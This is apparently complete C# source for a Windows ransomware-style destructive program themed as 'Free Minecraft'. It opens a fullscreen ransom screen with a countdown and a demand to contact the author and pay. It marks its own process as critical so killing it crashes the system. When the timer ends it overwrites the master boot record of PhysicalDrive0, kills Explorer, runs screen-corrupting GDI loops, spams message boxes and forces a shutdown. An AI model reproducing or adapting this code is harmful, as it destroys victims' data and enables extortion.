using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace DangerousMemz
{
    class Program : Form
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int n);

        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox txtKey;
        private RichTextBox rtbMessage;

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            // BSOD protection - jeśli proces zostanie zabity, system wywali błąd
            try { int i = 1; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref i, 4); } catch {}
            Application.Run(new Program());
        }

        public Program()
        {
            this.Text = "Opps, files encrypted";
            this.Size = new Size(1000, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(160, 0, 0); 
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            // Nagłówek
            Label lblMain = new Label() { 
                Text = "Opps, It look like your\nfiles have been\nENCRYPTED", 
                Font = new Font("Arial Black", 24, FontStyle.Bold), 
                ForeColor = Color.White, 
                Location = new Point(30, 40), 
                Size = new Size(420, 180),
                TextAlign = ContentAlignment.MiddleCenter
            };

            // Timer (Żółty, rzuca się w oczy)
            lblTimer = new Label() { 
                Text = "10:00", 
                Font = new Font("Consolas", 40, FontStyle.Bold), 
                Location = new Point(600, 30), 
                Size = new Size(350, 70), 
                TextAlign = ContentAlignment.MiddleRight, 
                ForeColor = Color.Yellow 
            };
            
            // Wiadomość o "Free Minecraft"
            rtbMessage = new RichTextBox() { 
                Location = new Point(480, 120), 
                Size = new Size(480, 350), 
                BackColor = Color.White, 
                Font = new Font("Segoe UI Semibold", 11), 
                ReadOnly = true,
                Text = "Oops, it looks like your files have been encrypted by \"Free Minecraft.\" Do you seriously think you'll find real Minecraft for free? Well, there are launchers like \"lu*an, fear*her.\" I didn't write what's in the star because of copyright issues, lol. Returning to the virus, to decrypt your computer and save it, contact [UNSETTLED] and I'll reply. Then you'll pay and get the code. Good luck!"
            };

            // Pole klucza - Napis "Key."
            Label lblKeyHint = new Label() { Text = "Key.", ForeColor = Color.White, Font = new Font("Arial", 10, FontStyle.Bold), Location = new Point(50, 410) };
            txtKey = new TextBox() { 
                Text = "DBI_secret-2026", 
                Font = new Font("Consolas", 12), 
                Location = new Point(50, 435), 
                Size = new Size(380, 30),
                BackColor = Color.White
            };
            
            // Przycisk Activate
            Button btnActivate = new Button() { 
                Text = "ACTIVATE", 
                Location = new Point(50, 480), 
                Size = new Size(180, 45), 
                FlatStyle = FlatStyle.Flat, 
                BackColor = Color.White,
                Font = new Font("Arial", 10, FontStyle.Bold)
            };
            btnActivate.Click += (s, e) => {
                if (txtKey.Text == "DBI_SECRET-2026") {
                    int n = 0; NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref n, 4);
                    Environment.Exit(0);
                } else { MessageBox.Show("Invalid License Key!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            };

            // Przycisk Destroy Now
            Button btnDestroy = new Button() { 
                Text = "Destroy Now", 
                Location = new Point(780, 480), 
                Size = new Size(180, 45), 
                FlatStyle = FlatStyle.Flat, 
                BackColor = Color.Black, 
                ForeColor = Color.White,
                Font = new Font("Arial", 9, FontStyle.Bold)
            };
            btnDestroy.Click += (s, e) => { timeLeft = 0; };

            this.Controls.AddRange(new Control[] { lblMain, lblTimer, rtbMessage, lblKeyHint, txtKey, btnActivate, btnDestroy });

            // Timer logic
            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) { 
                    timeLeft--; 
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); 
                } else { 
                    t.Stop(); 
                    ExecuteDestruction(); 
                }
            };
            t.Start();
        }

        void ExecuteDestruction()
        {
            // MBR Kill
            try { uint w; IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
            WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); } catch {}

            // Kill Explorer
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe") { WindowStyle = ProcessWindowStyle.Hidden });

            // PAYLOAD: GREY TUNNEL
            Thread gdiThread = new Thread(() => {
                IntPtr hdc = GetDC(IntPtr.Zero);
                int sw = GetSystemMetrics(0); int sh = GetSystemMetrics(1);
                while(true) {
                    // Szarzenie/Przyciemnianie
                    BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, 0x001100A6); 
                    Thread.Sleep(150);
                    // Efekt Tunelu
                    BitBlt(hdc, 8, 8, sw - 16, sh - 16, hdc, 0, 0, 0x00CC0020);
                    Thread.Sleep(40); 
                }
            });
            gdiThread.Start();

            // PAYLOAD: MSG BOX SPAM
            Thread msgThread = new Thread(() => {
                while(true) {
                    new Thread(() => MessageBox.Show("Your PC belongs to Free Minecraft now.", "RIP", MessageBoxButtons.OK, MessageBoxIcon.Hand)).Start();
                    Thread.Sleep(3000); // Co 3 sekundy nowe okienko
                }
            });
            msgThread.Start();

            // SHUTDOWN PO 1 MINUCIE (60 sekund)
            Process.Start("shutdown", "/s /t 60 /c \"PC saying BYE BYE\"");

            this.Invoke((MethodInvoker)delegate {
                this.Controls.Clear();
                this.BackColor = Color.Black;
                Label l = new Label() { Text = "BYE BYE", Font = new Font("Impact", 120, FontStyle.Bold), ForeColor = Color.DarkGray, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
                this.Controls.Add(l);
            });
        }
    }
}
